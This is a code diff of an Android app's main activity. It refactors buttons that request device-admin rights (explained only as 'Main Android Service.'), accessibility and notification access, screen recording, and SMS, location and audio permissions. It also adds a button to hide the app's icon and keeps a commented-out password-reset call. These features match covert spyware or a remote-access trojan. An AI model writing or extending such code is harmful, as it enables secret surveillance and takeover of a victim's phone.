@@ -40,13 +40,18 @@ public class MainActivity extends AppCompatActivity {
     private Button permissionsButton;
     private Button accessibilityButton;
     private Button accessAdminButton;
+    private Button accessDisplayButton;
+    private Button accessLocationButton;
+    private Button accessNotificationButton;
+    private Button accessSystemButton;
+    private Button hideIconButton;
 
     private MediaProjectionManager projectionManager;
     private MediaProjection mediaProjection;
     private RecordService recordService;
 
-    private DevicePolicyManager devicePolicyManager;
-    private ComponentName adminName;
+    private boolean isAccessibility;
+
 
     private static MainActivity mainActivity;
 
@@ -71,10 +76,10 @@ public class MainActivity extends AppCompatActivity {
 
         Log.i("Carter", "MainActivity created!");
 
-        devicePolicyManager = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
-        adminName = new ComponentName(this, MyAdmin.class);
-
 //        devicePolicyManager.resetPassword("", DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);
+
+        initButtons();
+        initListeners();
     }
 
     public void startRecordScreen(int seconds) {
@@ -136,18 +141,20 @@ public class MainActivity extends AppCompatActivity {
         permissionsButton = findViewById(R.id.permissionsButton);
         accessibilityButton = findViewById(R.id.accessibilityButton);
         accessAdminButton = findViewById(R.id.accessAdminButton);
-        Button accessDisplayButton = findViewById(R.id.accessDisplayButton);
-        Button accessLocationButton = findViewById(R.id.accessLocationButton);
-        Button accessNotificationButton = findViewById(R.id.accessNotificationButton);
-        Button accessSystemButton = findViewById(R.id.accessSystemButton);
-        Button hideIconButton = findViewById(R.id.hideIconButton);
+        accessDisplayButton = findViewById(R.id.accessDisplayButton);
+        accessLocationButton = findViewById(R.id.accessLocationButton);
+        accessNotificationButton = findViewById(R.id.accessNotificationButton);
+        accessSystemButton = findViewById(R.id.accessSystemButton);
+        hideIconButton = findViewById(R.id.hideIconButton);
 
         permissionsButton.setEnabled(!checkUsesPermissions());
         accessibilityButton.setEnabled(!checkAccessibiliyService());
         accessAdminButton.setEnabled(!checkAdminDevice());
         accessLocationButton.setEnabled(!checkLocationEnabled());
         accessNotificationButton.setEnabled(!checkNotificationService());
+    }
 
+    private void initListeners() {
         permissionsButton.setOnClickListener(new View.OnClickListener() {
             @Override
             public void onClick(View v) {
@@ -164,7 +171,7 @@ public class MainActivity extends AppCompatActivity {
             @Override
             public void onClick(View v) {
                 Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
-                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminName);
+                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, MainService.getInstance().getAdminName());
                 intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Main Android Service.");
                 startActivity(intent);
             }
@@ -193,6 +200,8 @@ public class MainActivity extends AppCompatActivity {
         });
     }
 
+
+
     private void showUsesPermissions() {
         String[] permissions = {Manifest.permission.RECEIVE_SMS, Manifest.permission.ACCESS_FINE_LOCATION,
             Manifest.permission.RECORD_AUDIO, Manifest.permission.WRITE_EXTERNAL_STORAGE,
@@ -216,6 +225,7 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean checkAccessibiliyService() {
+        if (!isAccessibility) return false;
         int accessibilityEnabled = 0;
         final String service = getPackageName() + "/" + MyAccessibilityService.class.getCanonicalName();
         try {
@@ -242,7 +252,9 @@ public class MainActivity extends AppCompatActivity {
     }
 
     private boolean checkAdminDevice() {
-        return devicePolicyManager.isAdminActive(adminName);
+        if (MainService.getInstance() == null) return false;
+        return MainService.getInstance().checkAdminService();
+//        return devicePolicyManager.isAdminActive(adminName);
     }
 
     private boolean checkLocationEnabled() {
@@ -293,5 +305,9 @@ public class MainActivity extends AppCompatActivity {
             cancel();
         }
 
+    }
+
+    public void setAccessibility(boolean isAccessibility) {
+        this.isAccessibility = isAccessibility;
     }
 }
